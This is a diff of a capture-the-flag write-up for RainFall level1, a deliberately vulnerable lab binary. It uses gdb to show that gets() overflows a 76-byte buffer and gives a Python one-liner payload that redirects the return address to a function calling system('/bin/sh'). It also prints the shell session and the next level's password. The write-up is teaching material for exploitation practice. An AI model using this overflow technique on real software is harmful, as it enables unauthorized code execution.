@@ -1,16 +1,14 @@
-
 # Level 1
 
-The binary we now have, only use the gets() C function.
 
-
-We already know this functions is vulnerable to buffer overflow attacks, so we are going to overwrite the EIP so its execute a subshell for us.
+We have a new binary, lets read what's inside :
 
 
 
-# GDB
+```
+(gdb) info functions
+All defined functions:
 
-```gdb
 Non-debugging symbols:
 0x080482f8  _init
 0x08048340  gets
@@ -34,15 +32,11 @@ Non-debugging symbols:
 0x08048520  __do_global_ctors_aux
 0x0804854c  _fini
 (gdb) 
-
 ```
 
-So we have 2 function, main and run
+We see there is some generic system function, but there is a main, and a run function.
 
-
-main :
-```gdb
-
+```
 Dump of assembler code for function main:
    0x08048480 <+0>:	push   %ebp
    0x08048481 <+1>:	mov    %esp,%ebp
@@ -54,103 +48,143 @@ Dump of assembler code for function main:
    0x08048495 <+21>:	leave  
    0x08048496 <+22>:	ret    
 End of assembler dump.
-(gdb)
-
+(gdb) 
 ```
 
-run
-
-```gdb
-Dump of assembler code for function main:
-   0x08048480 <+0>:	push   ebp
-   0x08048481 <+1>:	mov    ebp,esp
-   0x08048483 <+3>:	and    esp,0xfffffff0
-   0x08048486 <+6>:	sub    esp,0x50
-   0x08048489 <+9>:	lea    eax,[esp+0x10]
-   0x0804848d <+13>:	mov    DWORD PTR [esp],eax
-   0x08048490 <+16>:	call   0x8048340 <gets@plt>
-   0x08048495 <+21>:	leave  
-   0x08048496 <+22>:	ret    
-End of assembler dump.
+The main consist of just doing a get() and nothing else so that's all the binary is doing.
 
 
 ```
-
-The main function use the gets(), lets take a look at the run function.
-
-```gdb
-
-(gdb) disas run 
 Dump of assembler code for function run:
-   0x08048444 <+0>:	push   ebp
-   0x08048445 <+1>:	mov    ebp,esp
-   0x08048447 <+3>:	sub    esp,0x18
-   0x0804844a <+6>:	mov    eax,ds:0x80497c0
-   0x0804844f <+11>:	mov    edx,eax
-   0x08048451 <+13>:	mov    eax,0x8048570
-   0x08048456 <+18>:	mov    DWORD PTR [esp+0xc],edx
-   0x0804845a <+22>:	mov    DWORD PTR [esp+0x8],0x13
-   0x08048462 <+30>:	mov    DWORD PTR [esp+0x4],0x1
-   0x0804846a <+38>:	mov    DWORD PTR [esp],eax
+   0x08048444 <+0>:	push   %ebp
+   0x08048445 <+1>:	mov    %esp,%ebp
+   0x08048447 <+3>:	sub    $0x18,%esp
+   0x0804844a <+6>:	mov    0x80497c0,%eax
+   0x0804844f <+11>:	mov    %eax,%edx
+   0x08048451 <+13>:	mov    $0x8048570,%eax
+   0x08048456 <+18>:	mov    %edx,0xc(%esp)
+   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
+   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
+   0x0804846a <+38>:	mov    %eax,(%esp)
    0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
-   0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
+   0x08048472 <+46>:	movl   $0x8048584,(%esp)
    0x08048479 <+53>:	call   0x8048360 <system@plt>
    0x0804847e <+58>:	leave  
    0x0804847f <+59>:	ret    
 End of assembler dump.
-(gdb) x/s 0x8048584
-0x8048584:	 "/bin/sh"
 (gdb) 
-
 ```
 
-The run function use the system() call on "/bin/sh", tho the run function is not triggered by the main function.
+Tho the run() function seems to be our door for the flag.
 
-So we will overwrite the EIP so it execute the addresse of "run"
+The gets() function vulnerable to Buffer overflow attacks, and since it is used by main, we are going to attack it.
+
+Since the run might be our door for the flag, we are going to overwrite the EIP (Extented Instruction Pointer) of the main, so it points to the adress of the run function.
+
+The program wil segfault when the EIP points to an adress it doesn't own, this will be our hint to know where the EIP is so we can overwrite it.
 
 
-The programm segfault when the EIP point to an addresse it doesn't own, so we can get the EIP adresses by making it segfaulting like so.
+By giving an input of a lot of A
 
+```
+Continuing.
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
-```gdb
-
-(gdb) run
-The program being debugged has been started already.
-Start it from the beginning? (y or n) y
-Starting program: /home/user/level1/level1 
-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 
 Program received signal SIGSEGV, Segmentation fault.
 0x41414141 in ?? ()
+
+(gdb) info register
+eax            0xbffff6f0	-1073744144
+ecx            0xb7fd28c4	-1208145724
+edx            0xbffff6f0	-1073744144
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff740	0xbffff740
+ebp            0x41414141	0x41414141
+esi            0x0	0
+edi            0x0	0
+eip            0x41414141	0x41414141
+eflags         0x210282	[ SF IF RF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) 
+
+
+
+```
+
+We see our EIP got overwriten with 0x41 which the ascii of A.
+
+So instead of re-running the debugger a lot of times by substracting A until we find the exact number of char needed to reach the EIP, we are going to use an offset tool pattern.
+
+```
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x63413563 in ?? ()
 (gdb) 
 
 ```
 
-The program segfaulted at 0x41414141,, 0x41 refer to the 'A' letter, so we successfuly overwritted it, but we must know how many A it needed to reach the EIP, so we can position to his adresses, and then overwrite it with the run function adresses so it execute it.
+And by subsctrating the return adress with the user input we know the offset is 76.
 
 
-There is a lot of ways to calculate it, like knowing the size of the buffer, or using tools.
+So we know that the buffer is 76, and we need to write 76 A to reach the EIP and from here inject what we want.
 
-By using ghidra we know that the buffer size is 76.
 
-So we are going to print 76 A, and then print the adresse of the run function in reverse order since it will read the adresse in reverse order.
+The adress of the run function is the following, 
+0x08048444, and we must give it in backward since the current processor use little-endian coding . (google).
 
-```sh
-level1@RainFall:~$ python -c "print 'A' * 76 + '\x44\x84\x04\x08'" | ./level1
+```
+level1@RainFall:~$ python -c "print 'A' * 76 + '\x44\x84\x04\x08'" | ./level1 
 Good... Wait what?
 Segmentation fault (core dumped)
 level1@RainFall:~$ 
+
 ```
 
-It did executed our function but we dont have access to the shell.
+By giving this as input the binary show us a really good message, it worked ! Lets show in-depth what the run function does.
 
-```sh
-(python -c "print 'A' * 76 + '\x44\x84\x04\x08'" ; cat) | ./level1
-level1@RainFall:~$ (python -c "print 'A' * 76 + '\x44\x84\x04\x08'" ; cat) | ./level1
+
+```gdb
+Dump of assembler code for function run:
+   0x08048444 <+0>:	push   %ebp
+   0x08048445 <+1>:	mov    %esp,%ebp
+   0x08048447 <+3>:	sub    $0x18,%esp
+   0x0804844a <+6>:	mov    0x80497c0,%eax
+   0x0804844f <+11>:	mov    %eax,%edx
+   0x08048451 <+13>:	mov    $0x8048570,%eax
+   0x08048456 <+18>:	mov    %edx,0xc(%esp)
+   0x0804845a <+22>:	movl   $0x13,0x8(%esp)
+   0x08048462 <+30>:	movl   $0x1,0x4(%esp)
+   0x0804846a <+38>:	mov    %eax,(%esp)
+   0x0804846d <+41>:	call   0x8048350 <fwrite@plt>
+   0x08048472 <+46>:	movl   $0x8048584,(%esp)
+   0x08048479 <+53>:	call   0x8048360 <system@plt>
+   0x0804847e <+58>:	leave  
+   0x0804847f <+59>:	ret    
+End of assembler dump.
+(gdb) x/s 0x8048570
+0x8048570:	 "Good... Wait what?\n"
+(gdb) x/s 0x8048584
+0x8048584:	 "/bin/sh"
+(gdb) 
+```
+
+It print "Good... Wait what?" and then execute the system syscall with "/bin/sh"
+
+So it should be executing a shell so that we can go to the next level, but it crashed, we need to keep an input on the binary.
+
+
+```
+level1@RainFall:~$ (python -c "print 'A' * 76 + '\x44\x84\x04\x08'" ; cat) | ./level1 
 Good... Wait what?
 cat /home/user/level2/.pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
-
 ```
 
-And we got our flag
+We print give the injection input to the binary while and then execute a cat to still have an input on it, so that after the "/bin/sh" call we can still write to the binary and cat our flag.
